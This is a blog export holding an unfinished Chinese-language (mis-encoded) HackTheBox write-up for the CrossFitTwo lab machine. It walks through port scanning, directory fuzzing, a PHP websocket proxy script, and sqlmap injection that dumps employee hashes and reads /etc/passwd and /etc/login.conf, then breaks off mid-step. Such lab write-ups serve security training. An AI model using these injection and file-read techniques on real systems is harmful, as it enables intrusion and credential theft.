{"meta":{"title":"Lucifiel's Blog","subtitle":"Lucifiel æŠ€æœ¯åšå®¢","description":"Lucifiel æŠ€æœ¯åšå®¢","author":"Lucifiel","url":"http://www.lucifiel.com","root":"/"},"pages":[{"title":"","date":"2023-05-19T09:01:11.000Z","updated":"2023-05-19T09:01:11.000Z","comments":false,"path":"tags/index.html","permalink":"http://www.lucifiel.com/tags/index.html","excerpt":"","text":""},{"title":"","date":"2023-05-19T09:01:34.000Z","updated":"2023-05-19T09:01:34.000Z","comments":false,"path":"categories/index.html","permalink":"http://www.lucifiel.com/categories/index.html","excerpt":"","text":""},{"title":"about","date":"2022-08-03T04:12:29.000Z","updated":"2022-08-04T01:37:12.000Z","comments":true,"path":"about/index.html","permalink":"http://www.lucifiel.com/about/index.html","excerpt":"","text":"æˆ‘æ˜¯Lucifielï¼Œè·¯è¥¿è²å°”æ˜¯æˆ‘ä¸ªäººå¸¸ç”¨IDï¼Œä¸€ä¸ªè¯´ä¹¦äººç½¢äº†ã€‚ ä¸€ä¸ªä»¥è¯´ä¹¦ä¸ºä¸»ä¸šçš„æ··å­ï¼Œå®‰å…¨åªæ˜¯å…´è¶£çˆ±å¥½ä¹‹ä¸€ï¼Œå–œæ¬¢ç ”ç©¶æ‰€æœ‰æˆ‘æ„Ÿå…´è¶£çš„ä¸œè¥¿å’ŒæŠ€æœ¯ã€‚ å¯¹æŠ€æœ¯å’ŒæœªçŸ¥å……æ»¡å…´è¶£ï¼Œå–œæ¬¢ç ”ç©¶å’Œç¢ç£¨æœ‰çš„æ²¡çš„å¥½ç©çš„ã€‚ æˆ‘çš„æ¢¦æƒ³ä¹‹ä¸€å°±æ˜¯èƒ½è¢«å¤§å®¶æèµ·çš„æ—¶å€™ï¼Œæœ‰äººè§‰å¾—æˆ‘æ˜¯ä¸€åä¸–ç•Œçº§çš„æ”»é˜²æŠ€æœ¯ç ”ç©¶äººå‘˜ï¼Œä¸è¿‡æš‚æ—¶æ²¡æœ‰ä»€ä¹ˆå¯ä»¥æ‹¿å¾—å‡ºæ‰‹çš„ä¸œè¥¿ã€‚ å¼€åšå®¢ä¹Ÿåªæ˜¯ä¸ºäº†ç£ä¿ƒè‡ªå·±æœ‰ä¸€ä¸ªè®°å½•æ–‡æ¡£çš„ä¹ æƒ¯ã€‚ æœ‰äº‹å¯ä»¥å‘é‚®ä»¶ï¼Œæˆ‘ä¼šä¸å®šæ—¶æŸ¥çœ‹é‚®ç®±çš„ &#x4c;&#117;&#x63;&#x69;&#102;&#105;&#x65;&#108;&#72;&#x61;&#x63;&#x6b;&#x40;&#113;&#113;&#x2e;&#x63;&#111;&#x6d;ã€‚"}],"posts":[{"title":"CrossFitTwo - Hackthebox - è¿˜æ²¡åšå®Œ","slug":"Hackthebox - CrossFitTwoæœªå®Œæˆ","date":"2023-05-19T11:38:36.000Z","updated":"2023-05-20T01:30:33.000Z","comments":true,"path":"2023/05/19/Hackthebox - CrossFitTwoæœªå®Œæˆ/","link":"","permalink":"http://www.lucifiel.com/2023/05/19/Hackthebox%20-%20CrossFitTwo%E6%9C%AA%E5%AE%8C%E6%88%90/","excerpt":"","text":"Hackthebox - CrossFitTwoæœªå®Œæˆé¶åœºä¿¡æ¯ é¶åœºç±»å‹ ä¿¡æ¯æœé›†é¦–å…ˆä½¿ç”¨nmapè¿›è¡Œä¿¡æ¯æœé›† â”Œâ”€â”€(rootğŸ’€root)-[~/Desktop] â””â”€# nmap -A -sS -sC -sV -p- 10.10.10.232 Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-28 20:35 CST WARNING: Service 10.10.10.232:80 had already soft-matched http, but now soft-matched rtsp; ignoring second value Nmap scan report for 10.10.10.232 Host is up (0.24s latency). Not shown: 65532 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.4 (protocol 2.0) | ssh-hostkey: | 3072 35:0a:81:06:de:be:8c:d8:d7:27:66:db:96:94:fd:52 (RSA) | 256 94:60:55:35:9a:1a:a8:45:a1:ae:19:cd:61:05:ec:3f (ECDSA) |_ 256 a2:c8:6b:6e:11:b6:70:69:db:d2:60:2e:2f:d1:2f:ab (ED25519) 80/tcp open http (PHP 7.4.12) | fingerprint-strings: | GetRequest, HTTPOptions: | HTTP/1.0 200 OK | Connection: close | Connection: close | Content-type: text/html; charset=UTF-8 | Date: Wed, 28 Jul 2021 13:03:17 GMT | Server: OpenBSD httpd | X-Powered-By: PHP/7.4.12 | &lt;!DOCTYPE html&gt; | &lt;html lang=&quot;zxx&quot;&gt; | &lt;head&gt; | &lt;meta charset=&quot;UTF-8&quot;&gt; | &lt;meta name=&quot;description&quot; content=&quot;Yoga StudioCrossFit&quot;&gt; | &lt;meta name=&quot;keywords&quot; content=&quot;Yoga, unica, creative, html&quot;&gt; | &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; | &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt; | &lt;title&gt;CrossFit&lt;/title&gt; | &lt;!-- Google Font --&gt; | &lt;link href=&quot;https://fonts.googleapis.com/css?family=PT+Sans:400,700&amp;display=swap&quot; rel=&quot;stylesheet&quot;&gt; | &lt;link href=&quot;https://fonts.googleapis.com/css?family=Oswald:400,500,600,700&amp;display=swap&quot; rel=&quot;stylesheet&quot;&gt; | &lt;!-- Css Styles --&gt; | &lt;link rel=&quot;stylesheet&quot; href=&quot;css/bootstrap.min.css&quot; type=&quot;text/css&quot;&gt; |_ &lt;link rel=&quot;styleshe |_http-server-header: OpenBSD httpd |_http-title: CrossFit 8953/tcp open ssl/ub-dns-control? | ssl-cert: Subject: commonName=unbound | Not valid before: 2021-01-11T07:01:10 |_Not valid after: 2040-09-28T07:01:10 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port80-TCP:V=7.91%I=7%D=7/28%Time=610152AC%P=x86_64-pc-linux-gnu%r(GetR SF:equest,3541,&quot;HTTP/1\\.0\\x20200\\x20OK\\r\\nConnection:\\x20close\\r\\nConnecti SF:on:\\x20close\\r\\nContent-type:\\x20text/html;\\x20charset=UTF-8\\r\\nDate:\\x SF:20Wed,\\x2028\\x20Jul\\x202021\\x2013:03:17\\x20GMT\\r\\nServer:\\x20OpenBSD\\x2 SF:0httpd\\r\\nX-Powered-By:\\x20PHP/7\\.4\\.12\\r\\n\\r\\n&lt;!DOCTYPE\\x20html&gt;\\n&lt;htm SF:l\\x20lang=\\&quot;zxx\\&quot;&gt;\\n\\n&lt;head&gt;\\n\\x20\\x20\\x20\\x20&lt;meta\\x20charset=\\&quot;UTF-8\\ SF:&quot;&gt;\\n\\x20\\x20\\x20\\x20&lt;meta\\x20name=\\&quot;description\\&quot;\\x20content=\\&quot;Yoga\\x20 SF:StudioCrossFit\\&quot;&gt;\\n\\x20\\x20\\x20\\x20&lt;meta\\x20name=\\&quot;keywords\\&quot;\\x20conten SF:t=\\&quot;Yoga,\\x20unica,\\x20creative,\\x20html\\&quot;&gt;\\n\\x20\\x20\\x20\\x20&lt;meta\\x20n SF:ame=\\&quot;viewport\\&quot;\\x20content=\\&quot;width=device-width,\\x20initial-scale=1\\.0 SF:\\&quot;&gt;\\n\\x20\\x20\\x20\\x20&lt;meta\\x20http-equiv=\\&quot;X-UA-Compatible\\&quot;\\x20content SF:=\\&quot;ie=edge\\&quot;&gt;\\n\\x20\\x20\\x20\\x20&lt;title&gt;CrossFit&lt;/title&gt;\\n\\n\\x20\\x20\\x20\\ SF:x20&lt;!--\\x20Google\\x20Font\\x20--&gt;\\n\\x20\\x20\\x20\\x20&lt;link\\x20href=\\&quot;https SF:://fonts\\.googleapis\\.com/css\\?family=PT\\+Sans:400,700&amp;display=swap\\&quot;\\x SF:20rel=\\&quot;stylesheet\\&quot;&gt;\\n\\x20\\x20\\x20\\x20&lt;link\\x20href=\\&quot;https://fonts\\.g SF:oogleapis\\.com/css\\?family=Oswald:400,500,600,700&amp;display=swap\\&quot;\\x20rel SF:=\\&quot;stylesheet\\&quot;&gt;\\n\\n\\x20\\x20\\x20\\x20&lt;!--\\x20Css\\x20Styles\\x20--&gt;\\n\\x20\\ SF:x20\\x20\\x20&lt;link\\x20rel=\\&quot;stylesheet\\&quot;\\x20href=\\&quot;css/bootstrap\\.min\\.cs SF:s\\&quot;\\x20type=\\&quot;text/css\\&quot;&gt;\\n\\x20\\x20\\x20\\x20&lt;link\\x20rel=\\&quot;styleshe&quot;)%r( SF:HTTPOptions,1AFC,&quot;HTTP/1\\.0\\x20200\\x20OK\\r\\nConnection:\\x20close\\r\\nCon SF:nection:\\x20close\\r\\nContent-type:\\x20text/html;\\x20charset=UTF-8\\r\\nDa SF:te:\\x20Wed,\\x2028\\x20Jul\\x202021\\x2013:03:17\\x20GMT\\r\\nServer:\\x20OpenB SF:SD\\x20httpd\\r\\nX-Powered-By:\\x20PHP/7\\.4\\.12\\r\\n\\r\\n&lt;!DOCTYPE\\x20html&gt;\\ SF:n&lt;html\\x20lang=\\&quot;zxx\\&quot;&gt;\\n\\n&lt;head&gt;\\n\\x20\\x20\\x20\\x20&lt;meta\\x20charset=\\&quot;U SF:TF-8\\&quot;&gt;\\n\\x20\\x20\\x20\\x20&lt;meta\\x20name=\\&quot;description\\&quot;\\x20content=\\&quot;Yog SF:a\\x20StudioCrossFit\\&quot;&gt;\\n\\x20\\x20\\x20\\x20&lt;meta\\x20name=\\&quot;keywords\\&quot;\\x20c SF:ontent=\\&quot;Yoga,\\x20unica,\\x20creative,\\x20html\\&quot;&gt;\\n\\x20\\x20\\x20\\x20&lt;meta SF:\\x20name=\\&quot;viewport\\&quot;\\x20content=\\&quot;width=device-width,\\x20initial-scale SF:=1\\.0\\&quot;&gt;\\n\\x20\\x20\\x20\\x20&lt;meta\\x20http-equiv=\\&quot;X-UA-Compatible\\&quot;\\x20co SF:ntent=\\&quot;ie=edge\\&quot;&gt;\\n\\x20\\x20\\x20\\x20&lt;title&gt;CrossFit&lt;/title&gt;\\n\\n\\x20\\x20 SF:\\x20\\x20&lt;!--\\x20Google\\x20Font\\x20--&gt;\\n\\x20\\x20\\x20\\x20&lt;link\\x20href=\\&quot; SF:https://fonts\\.googleapis\\.com/css\\?family=PT\\+Sans:400,700&amp;display=swa SF:p\\&quot;\\x20rel=\\&quot;stylesheet\\&quot;&gt;\\n\\x20\\x20\\x20\\x20&lt;link\\x20href=\\&quot;https://fon SF:ts\\.googleapis\\.com/css\\?family=Oswald:400,500,600,700&amp;display=swap\\&quot;\\x SF:20rel=\\&quot;stylesheet\\&quot;&gt;\\n\\n\\x20\\x20\\x20\\x20&lt;!--\\x20Css\\x20Styles\\x20--&gt;\\n SF:\\x20\\x20\\x20\\x20&lt;link\\x20rel=\\&quot;stylesheet\\&quot;\\x20href=\\&quot;css/bootstrap\\.mi SF:n\\.css\\&quot;\\x20type=\\&quot;text/css\\&quot;&gt;\\n\\x20\\x20\\x20\\x20&lt;link\\x20rel=\\&quot;styleshe SF:&quot;); No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.91%E=4%D=7/28%OT=22%CT=1%CU=43404%PV=Y%DS=2%DC=T%G=Y%TM=610152E OS:6%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10B%TI=RD%CI=RI%II=RI%TS=22 OS:)OPS(O1=M54DNNSNW6NNT11%O2=M54DNNSNW6NNT11%O3=M54DNW6NNT11%O4=M54DNNSNW6 OS:NNT11%O5=M54DNNSNW6NNT11%O6=M54DNNSNNT11)WIN(W1=4000%W2=4000%W3=4000%W4= OS:4000%W5=4000%W6=4000)ECN(R=Y%DF=Y%T=40%W=4000%O=M54DNNSNW6%CC=N%Q=)T1(R= OS:Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A OS:%A=S%F=AR%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R= OS:Y%DF=Y%T=40%W=0%S=A%A=S%F=AR%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=FF%IPL=38%U OS:N=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=S%T=FF%CD=S) Network Distance: 2 hops TRACEROUTE (using port 3306/tcp) HOP RTT ADDRESS 1 237.08 ms 10.10.14.1 2 237.15 ms 10.10.10.232 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 989.11 seconds ä»ä¸Šé¢çš„æ‰«æç»“æœå’±ä»¬å¯ä»¥å¾—åˆ°çš„çº¿ç´¢æœ‰ - æœ¬å°é¶æœºå¼€å¯äº†22ï¼Œ80ï¼Œ8953ç«¯å£ - 80ç«¯å£ä¸ºhttpæœåŠ¡ - 8953ä¸ºsslæœåŠ¡ å’±ä»¬å…ˆè¿›80ç«¯å£çœ‹çœ‹ å’±ä»¬å…ˆè¿›è¡Œç›®å½•è·¯å¾„fuzzå§ â”Œâ”€â”€(rootğŸ’€root)-[~/Desktop] â””â”€# gobuster dir -u http://10.10.10.232 -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt -b 403,404 =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.232 [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/common.txt [+] Negative Status codes: 403,404 [+] User Agent: gobuster/3.1.0 [+] Extensions: php,html,txt [+] Timeout: 10s =============================================================== 2021/07/28 21:27:27 Starting gobuster in directory enumeration mode =============================================================== /about-us.php (Status: 200) [Size: 15733] /blog.php (Status: 200) [Size: 15369] /classes.php (Status: 200) [Size: 25946] /contact.php (Status: 200) [Size: 8007] /css (Status: 301) [Size: 510] [--&gt; http://10.10.10.232/css/] /elements.php (Status: 200) [Size: 19654] /fonts (Status: 301) [Size: 510] [--&gt; http://10.10.10.232/fonts/] /images (Status: 301) [Size: 510] [--&gt; http://10.10.10.232/images/] /img (Status: 301) [Size: 510] [--&gt; http://10.10.10.232/img/] /index.php (Status: 200) [Size: 19041] /index.php (Status: 200) [Size: 19041] /js (Status: 301) [Size: 510] [--&gt; http://10.10.10.232/js/] /main.html (Status: 200) [Size: 931] /readme.txt (Status: 200) [Size: 410] /vendor (Status: 301) [Size: 510] [--&gt; http://10.10.10.232/vendor/] =============================================================== 2021/07/28 21:38:26 Finished =============================================================== æ‰«æçš„åŒæ—¶ï¼Œåœ¨80ç«¯å£æ‰‹åŠ¨æ”¶é›†äº†ä¸€ä¸‹ä¿¡æ¯ã€‚ç‚¹å‡»MEMBER AREAä¼šè·³è½¬åˆ°ä¸€ä¸ªåŸŸåemployees.crossfit.htbï¼Œä½†å’±ä»¬æœ¬åœ°æ²¡æœ‰æ·»åŠ è§£æï¼Œæ‰€ä»¥æˆ‘ä»¬ç»™å®ƒæ·»åŠ ä¸Š echo 10.10.10.232 crossfit.htb employees.crossfit.htb &gt;&gt; /etc/hosts ç„¶åå°±å¯ä»¥è®¿é—®è¿™ä¸ªåŸŸåäº† è®¿é—®åå‘ç°æ˜¯ä¸€ä¸ªç™»å½•é¡µé¢ï¼Œæ‰‹åŠ¨æµ‹è¯•äº†å‡ ä¸ªå¼±å£ä»¤æ²¡æœ‰æˆåŠŸï¼Œå’±ä»¬ä¾ç„¶æŒ‚ä¸Šç›®å½•fuzzç„¶åå»è¿›è¡Œå…¶ä»–çš„æœé›† â”Œâ”€â”€(rootğŸ’€root)-[~/Desktop] â””â”€# gobuster dir -u http://employees.crossfit.htb/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt -t 100 -b 403,404 =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://employees.crossfit.htb/ [+] Method: GET [+] Threads: 100 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/common.txt [+] Negative Status codes: 403,404 [+] User Agent: gobuster/3.1.0 [+] Extensions: php,html,txt [+] Timeout: 10s =============================================================== 2021/07/28 21:03:34 Starting gobuster in directory enumeration mode =============================================================== /css (Status: 301) [Size: 510] [--&gt; http://employees.crossfit.htb/css/] /index.php (Status: 200) [Size: 4412] /index.php (Status: 200) [Size: 4412] /js (Status: 301) [Size: 510] [--&gt; http://employees.crossfit.htb/js/] /vendor (Status: 301) [Size: 510] [--&gt; http://employees.crossfit.htb/vendor/] =============================================================== 2021/07/28 21:04:42 Finished =============================================================== æŸ¥çœ‹ä¸»é¡µçš„æµé‡ï¼Œè¿˜å¯ä»¥çœ‹åˆ°ä¸€ä¸ªåŸŸå gym.crossfit.htb çš„ websocket ï¼Œå’±ä»¬ä¹ŸåŠ å…¥åˆ°hostsé‡Œ echo 10.10.10.232 gym.crossfit.htb &gt;&gt; /etc/hosts è¯¥æ¡ä¿¡æ¯æ‰€åœ¨çš„jsæ–‡ä»¶ http://10.10.10.232/js/ws.min.js function updateScroll() { var e = document.getElementById(&#39;chats&#39;); e.scrollTop = e.scrollHeight } var token, ws = new WebSocket(&#39;ws://gym.crossfit.htb/ws/&#39;), pingTimeout = setTimeout(() =&gt;{ ws.close(), $(&#39;.chat-main&#39;).remove() }, 31000); function check_availability(e) { var s = new Object; s.message = &#39;available&#39;, s.params = String(e), s.token = token, ws.send(JSON.stringify(s)) } $(&#39;.chat-content&#39;).slideUp(), $(&#39;.hide-chat-box&#39;).click(function () { $(&#39;.chat-content&#39;).slideUp() }), $(&#39;.show-chat-box&#39;).click(function () { $(&#39;.chat-content&#39;).slideDown(), updateScroll() }), $(&#39;.close-chat-box&#39;).click(function () { $(&#39;.chat-main&#39;).remove() }), ws.onopen = function () { }, ws.onmessage = function (e) { &#39;ping&#39; === e.data ? (ws.send(&#39;pong&#39;), clearTimeout(pingTimeout)) : (response = JSON.parse(e.data), answer = response.message, answer.startsWith(&#39;Hello!&#39;) &amp;&amp; $(&#39;#ws&#39;).show(), token = response.token, $(&#39;#chat-messages&#39;).append(&#39;&lt;li class=&quot;receive-msg float-left mb-2&quot;&gt;&lt;div class=&quot;receive-msg-desc float-left ml-2&quot;&gt;&lt;p class=&quot;msg_display bg-white m-0 pt-1 pb-1 pl-2 pr-2 rounded&quot;&gt;&#39; + answer + &#39;&lt;/p&gt;&lt;/div&gt;&lt;/li&gt;&#39;), updateScroll()) }, $(&#39;#sendmsg&#39;).on(&#39;keypress&#39;, function (e) { if (13 === e.which) { $(this).attr(&#39;disabled&#39;, &#39;disabled&#39;); var s = $(&#39;#sendmsg&#39;).val(); if (&#39;&#39; !== s) { $(&#39;#chat-messages&#39;).append(&#39;&lt;li class=&quot;send-msg float-right mb-2&quot;&gt;&lt;p class=&quot;msg_display pt-1 pb-1 pl-2 pr-2 m-0 rounded&quot;&gt;&#39; + s + &#39;&lt;/p&gt;&lt;/li&gt;&#39;); var t = new Object; t.message = s, t.token = token, ws.send(JSON.stringify(t)), $(&#39;#sendmsg&#39;).val(&#39;&#39;), $(this).removeAttr(&#39;disabled&#39;), updateScroll() } } }); æ·»åŠ åå†è®¿é—®ä¸»é¡µï¼Œä¼šå‘ç°å³ä¸‹è§’å¤šäº†ä¸€ä¸ªèŠå¤©çª—ï¼Œå¤§çº¦30såä¼šæ¶ˆå¤± æ¼æ´åˆ©ç”¨æµ‹è¯•ä¸€ä¸‹Websockets python3 -m websockets ws://gym.crossfit.htb/ws/ {&quot;status&quot;:&quot;200&quot;,&quot;message&quot;:&quot;Hello! This is Arnold, your assistant. Type &#39;help&#39; to see available commands.&quot;,&quot;token&quot;:&quot;c7be5b4a23c5c16da958ff6ff7bd2a9ba12870159010824f6018199ece5fd8eb&quot;} æˆ‘ä»¬ä¼šå‘ç°ï¼Œæ¯æ¬¡è¯·æ±‚çš„tokneå€¼éƒ½ä¸ä¸€æ · æˆ‘ä»¬è‡ªå·±å†™ä¸€ä¸ªwebsocket-client &gt; å‚è€ƒè¿æ¥ https://amphp.org/websocket-client/ websocket-client.php &lt;?php require &#39;vendor/autoload.php&#39;; use Amp\\Websocket\\Client; Amp\\Loop::run(function () { $connection = yield Client\\connect(&#39;ws://gym.crossfit.htb/ws/&#39;); $message = yield $connection-&gt;receive(); $payload = yield $message-&gt;buffer(); $token = json_decode($payload, true)[&quot;token&quot;]; $check = json_encode(array(&#39;message&#39; =&gt; &#39;available&#39;, &#39;params&#39; =&gt; $_GET[&#39;id&#39;], &#39;token&#39; =&gt; $token)); yield $connection-&gt;send($check); $message = yield $connection-&gt;receive(); $payload = yield $message-&gt;buffer(); header(&quot;Content-Type: application/json&quot;); printf($payload); $connection-&gt;close(); }); composer require amphp/websocket-client php -S 0.0.0.0:1234 å¼€å¯ä»¥åï¼Œä½¿ç”¨curlè·å–ä¸€ä¸‹æˆ‘ä»¬çš„websocket-client.phpæ–‡ä»¶çš„å†…å®¹çœ‹çœ‹ curl http://127.0.0.1:1234/websocket-client.php â”Œâ”€â”€(rootğŸ’€root)-[~/Desktop] â””â”€# curl http://127.0.0.1:1234/websocket-client.php {&quot;status&quot;:&quot;200&quot;,&quot;message&quot;:&quot;I&#39;m sorry, this membership plan is currently unavailable.&quot;,&quot;token&quot;:&quot;69fc8199b15d3b5b2cbdc79c85d1173d9907a85d0f711348c4bd0273338a3e92&quot;,&quot;debug&quot;:&quot;[id: null]&quot;} æç¤ºid:nullï¼Œé‚£å’±ä»¬å°±ç»™å®ƒåŠ ä¸€ä¸ªidå‚æ•° curl http://127.0.0.1:1234/websocket-client.php?id=1 â”Œâ”€â”€(rootğŸ’€root)-[~/Desktop] â””â”€# curl http://127.0.0.1:1234/websocket-client.php?id=1 {&quot;status&quot;:&quot;200&quot;,&quot;message&quot;:&quot;Good news! This membership plan is available.&quot;,&quot;token&quot;:&quot;21968a22a2766f17daf66508929fcb0a0cd333bef79064b0cd90b10c165e096d&quot;,&quot;debug&quot;:&quot;[id: 1, name: 1-month]&quot;} OKï¼Œè¿™æ¬¡æœ‰å‚æ•°äº†ï¼Œé‚£çœ‹åˆ°è¿™é‡Œå¤§å®¶èƒ½æƒ³åˆ°ä»€ä¹ˆå‘¢ï¼Ÿåæ­£æˆ‘æƒ³åˆ°äº†æ³¨å…¥ï¼Œè¯´å¹²å°±å¹² sqlmap -u http://127.0.0.1:1234/websocket-client.php?id=1 --batch --dbs [14:38:53] [INFO] fetching database names available databases [1]: [*] information_schema OKï¼Œç¡®å®šæ˜¯å¯ä»¥æ³¨å…¥çš„äº†ï¼Œå’±ä»¬ä¸€æ­¥æ­¥æ³¨å…¥ä¸‹å» sqlmap -u http://127.0.0.1:1234/websocket-client.php?id=1 --batch --technique=B --threads=10 --dbs available databases [3]: [*] crossfit [*] employees [*] information_schema sqlmap -u http://127.0.0.1:1234/websocket-client.php?id=1 --batch --technique=B --threads=10 -D employees --tables Database: employees [2 tables] +----------------+ | employees | | password_reset | +----------------+ sqlmap -u http://127.0.0.1:1234/websocket-client.php?id=1 --batch --technique=B --threads=10 -D employees -T employees --dump Database: employees Table: employees [4 entries] +----+-----------------------------+------------------------------------------------------------------+---------------+ | id | email | password | username | +----+-----------------------------+------------------------------------------------------------------+---------------+ | 1 | david.palmer@crossfit.htb | fff34363f4d15e958f0fb9a7c2e7cc550a5672321d54b5712cd6e4fa17cd2ac8 | administrator | | 2 | will.smith@crossfit.htb | 06b4daca29092671e44ef8fad8ee38783b4294d9305853027d1b48029eac0683 | wsmith | | 3 | maria.williams@crossfit.htb | fe46198cb29909e5dd9f61af986ca8d6b4b875337261bdaa5204f29582462a9c | mwilliams | | 4 | jack.parker@crossfit.htb | 4de9923aba6554d148dbcd3369ff7c6e71841286e5106a69e250f779770b3648 | jparker | +----+-----------------------------+------------------------------------------------------------------+---------------+ æµ‹è¯•äº†ä¸€ä¸‹ï¼Œæ— æ³•è§£å¯†å‡ºæ¥ï¼Œè®©æˆ‘ä»¬æ¢ä¸ªæ€è·¯ è®©æˆ‘ä»¬ä½¿ç”¨sqlæ³¨å…¥è¯»å–ä¸€ä¸‹æ–‡ä»¶è¯•è¯• &gt; OpenBSDç›¸å…³é…ç½®æ–‡ä»¶ https://man.openbsd.org/?query=config&amp;apropos=1&amp;sec=5&amp;arch=default&amp;manpath=OpenBSD-current &#x2F;etc&#x2F;passwdsqlmap -u http://127.0.0.1:1234/websocket-client.php?id=1 --batch --technique=B --threads=10 --file-read=&quot;/etc/passwd&quot; root:*:0:0:Charlie &amp;:/root:/bin/ksh daemon:*:1:1:The devil himself:/root:/sbin/nologin operator:*:2:5:System &amp;:/operator:/sbin/nologin bin:*:3:7:Binaries Commands and Source:/:/sbin/nologin build:*:21:21:base and xenocara build:/var/empty:/bin/ksh sshd:*:27:27:sshd privsep:/var/empty:/sbin/nologin _portmap:*:28:28:portmap:/var/empty:/sbin/nologin _identd:*:29:29:identd:/var/empty:/sbin/nologin _rstatd:*:30:30:rpc.rstatd:/var/empty:/sbin/nologin _rusersd:*:32:32:rpc.rusersd:/var/empty:/sbin/nologin _fingerd:*:33:33:fingerd:/var/empty:/sbin/nologin _x11:*:35:35:X Server:/var/empty:/sbin/nologin _unwind:*:48:48:Unwind Daemon:/var/empty:/sbin/nologin _switchd:*:49:49:Switch Daemon:/var/empty:/sbin/nologin _traceroute:*:50:50:traceroute privdrop user:/var/empty:/sbin/nologin _ping:*:51:51:ping privdrop user:/var/empty:/sbin/nologin _unbound:*:53:53:Unbound Daemon:/var/unbound:/sbin/nologin _dpb:*:54:54:dpb privsep:/var/empty:/sbin/nologin _pbuild:*:55:55:dpb build user:/nonexistent:/sbin/nologin _pfetch:*:56:56:dpb fetch user:/nonexistent:/sbin/nologin _pkgfetch:*:57:57:pkg fetch user:/nonexistent:/sbin/nologin _pkguntar:*:58:58:pkg untar user:/nonexistent:/sbin/nologin _spamd:*:62:62:Spam Daemon:/var/empty:/sbin/nologin www:*:67:67:HTTP Server:/var/www:/sbin/nologin _isakmpd:*:68:68:isakmpd privsep:/var/empty:/sbin/nologin _rpki-client:*:70:70:rpki-client user:/nonexistent:/sbin/nologin _syslogd:*:73:73:Syslog Daemon:/var/empty:/sbin/nologin _pflogd:*:74:74:pflogd privsep:/var/empty:/sbin/nologin _bgpd:*:75:75:BGP Daemon:/var/empty:/sbin/nologin _tcpdump:*:76:76:tcpdump privsep:/var/empty:/sbin/nologin _dhcp:*:77:77:DHCP programs:/var/empty:/sbin/nologin _mopd:*:78:78:MOP Daemon:/var/empty:/sbin/nologin _tftpd:*:79:79:TFTP Daemon:/var/empty:/sbin/nologin _rbootd:*:80:80:rbootd Daemon:/var/empty:/sbin/nologin _ppp:*:82:82:PPP utilities:/var/empty:/sbin/nologin _ntp:*:83:83:NTP Daemon:/var/empty:/sbin/nologin _ftp:*:84:84:FTP Daemon:/var/empty:/sbin/nologin _ospfd:*:85:85:OSPF Daemon:/var/empty:/sbin/nologin _hostapd:*:86:86:HostAP Daemon:/var/empty:/sbin/nologin _dvmrpd:*:87:87:DVMRP Daemon:/var/empty:/sbin/nologin _ripd:*:88:88:RIP Daemon:/var/empty:/sbin/nologin _relayd:*:89:89:Relay Daemon:/var/empty:/sbin/nologin _ospf6d:*:90:90:OSPF6 Daemon:/var/empty:/sbin/nologin _snmpd:*:91:91:SNMP Daemon:/var/empty:/sbin/nologin _ypldap:*:93:93:YP to LDAP Daemon:/var/empty:/sbin/nologin _rad:*:94:94:IPv6 Router Advertisement Daemon:/var/empty:/sbin/nologin _smtpd:*:95:95:SMTP Daemon:/var/empty:/sbin/nologin _rwalld:*:96:96:rpc.rwalld:/var/empty:/sbin/nologin _nsd:*:97:97:NSD Daemon:/var/empty:/sbin/nologin _ldpd:*:98:98:LDP Daemon:/var/empty:/sbin/nologin _sndio:*:99:99:sndio privsep:/var/empty:/sbin/nologin _ldapd:*:100:100:LDAP Daemon:/var/empty:/sbin/nologin _iked:*:101:101:IKEv2 Daemon:/var/empty:/sbin/nologin _iscsid:*:102:102:iSCSI Daemon:/var/empty:/sbin/nologin _smtpq:*:103:103:SMTP Daemon:/var/empty:/sbin/nologin _file:*:104:104:file privsep:/var/empty:/sbin/nologin _radiusd:*:105:105:RADIUS Daemon:/var/empty:/sbin/nologin _eigrpd:*:106:106:EIGRP Daemon:/var/empty:/sbin/nologin _vmd:*:107:107:VM Daemon:/var/empty:/sbin/nologin _tftp_proxy:*:108:108:tftp proxy daemon:/nonexistent:/sbin/nologin _ftp_proxy:*:109:109:ftp proxy daemon:/nonexistent:/sbin/nologin _sndiop:*:110:110:sndio privileged user:/var/empty:/sbin/nologin _syspatch:*:112:112:syspatch unprivileged user:/var/empty:/sbin/nologin _slaacd:*:115:115:SLAAC Daemon:/var/empty:/sbin/nologin nobody:*:32767:32767:Unprivileged user:/nonexistent:/sbin/nologin _mysql:*:502:502:MySQL Account:/nonexistent:/sbin/nologin lucille:*:1002:1002:,,,:/home/lucille:/bin/csh node:*:1003:1003::/home/node:/bin/ksh _dbus:*:572:572:dbus user:/nonexistent:/sbin/nologin _redis:*:686:686:redis account:/var/redis:/sbin/nologin david:*:1004:1004:,,,:/home/david:/bin/csh john:*:1005:1005::/home/john:/bin/csh ftp:*:1006:1006:FTP:/home/ftp:/sbin/nologin &#x2F;etc&#x2F;login.confæ ¹æ®é…ç½®æ–‡ä»¶ï¼Œä½¿ç”¨æœ‰yubikeyï¼š sqlmap -u http://127.0.0.1:1234/websocket-client.php?id=1 --batch --technique=B --threads=10 --file-read=&quot;/etc/login.conf&quot; # $OpenBSD: login.conf,v 1.16 2020/06/23 